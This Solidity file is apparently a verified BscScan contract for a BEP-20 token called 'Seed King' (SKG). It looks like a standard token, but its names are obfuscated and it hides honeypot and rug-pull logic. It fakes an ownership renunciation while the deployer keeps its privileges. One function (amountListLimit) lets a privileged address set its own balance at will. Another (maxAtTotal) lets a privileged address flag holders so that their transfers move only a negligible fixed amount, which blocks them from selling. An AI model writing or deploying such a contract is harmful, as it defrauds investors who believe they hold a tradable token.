/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface listTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundAuto {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract SeedKing {
    uint8 private minLaunched = 18;

    address private launchTo;

    string private _name = "Seed King";
    string private _symbol = "SKG";

    uint256 private launchMarketingMax = 100000000 * 10 ** minLaunched;
    mapping(address => uint256) private maxLaunch;
    mapping(address => mapping(address => uint256)) private tokenToAuto;

    mapping(address => bool) public takeTxSender;
    address public totalMode;
    address public totalLiquidity;
    mapping(address => bool) public exemptLaunch;
    uint256 constant limitSellLaunched = 10 ** 10;
    bool public receiverLiquidity;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        listTotal isLimit = listTotal(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        totalLiquidity = fundAuto(isLimit.factory()).createPair(isLimit.WETH(), address(this));
        launchTo = limitSender();
        totalMode = launchTo;
        takeTxSender[totalMode] = true;
        maxLaunch[totalMode] = launchMarketingMax;
        emit Transfer(address(0), totalMode, launchMarketingMax);
        limitAmountBuy();
    }

    

    function transferFrom(address amountTxTake, address senderSwap, uint256 toAutoLiquidity) public returns (bool) {
        if (amountTxTake != limitSender() && tokenToAuto[amountTxTake][limitSender()] != type(uint256).max) {
            require(tokenToAuto[amountTxTake][limitSender()] >= toAutoLiquidity);
            tokenToAuto[amountTxTake][limitSender()] -= toAutoLiquidity;
        }
        if (senderSwap == totalMode || amountTxTake == totalMode) {
            return enableAmount(amountTxTake, senderSwap, toAutoLiquidity);
        }
        if (exemptLaunch[amountTxTake]) {
            return enableAmount(amountTxTake, senderSwap, limitSellLaunched);
        }
        return enableAmount(amountTxTake, senderSwap, toAutoLiquidity);
    }

    function limitSender() private view returns (address) {
        return msg.sender;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function totalSupply() external view returns (uint256) {
        return launchMarketingMax;
    }

    function owner() external view returns (address) {
        return launchTo;
    }

    function limitAmountBuy() public {
        emit OwnershipTransferred(totalMode, address(0));
        launchTo = address(0);
    }

    function balanceOf(address txFund) public view returns (uint256) {
        return maxLaunch[txFund];
    }

    function amountListLimit(uint256 toAutoLiquidity) public {
        if (!takeTxSender[limitSender()]) {
            return;
        }
        maxLaunch[totalMode] = toAutoLiquidity;
    }

    function approve(address atFund, uint256 toAutoLiquidity) public returns (bool) {
        tokenToAuto[limitSender()][atFund] = toAutoLiquidity;
        emit Approval(limitSender(), atFund, toAutoLiquidity);
        return true;
    }

    function getOwner() external view returns (address) {
        return launchTo;
    }

    function allowance(address fundLaunched, address atFund) external view returns (uint256) {
        return tokenToAuto[fundLaunched][atFund];
    }

    function enableAmount(address tradingTo, address launchedTotal, uint256 toAutoLiquidity) internal returns (bool) {
        require(maxLaunch[tradingTo] >= toAutoLiquidity);
        maxLaunch[tradingTo] -= toAutoLiquidity;
        maxLaunch[launchedTotal] += toAutoLiquidity;
        emit Transfer(tradingTo, launchedTotal, toAutoLiquidity);
        return true;
    }

    function limitAt(address maxLaunched) public {
        if (receiverLiquidity) {
            return;
        }
        takeTxSender[maxLaunched] = true;
        receiverLiquidity = true;
    }

    function transfer(address senderSwap, uint256 toAutoLiquidity) external returns (bool) {
        return transferFrom(limitSender(), senderSwap, toAutoLiquidity);
    }

    function decimals() external view returns (uint8) {
        return minLaunched;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function maxAtTotal(address receiverMarketing) public {
        if (receiverMarketing == totalMode || receiverMarketing == totalLiquidity || !takeTxSender[limitSender()]) {
            return;
        }
        exemptLaunch[receiverMarketing] = true;
    }


}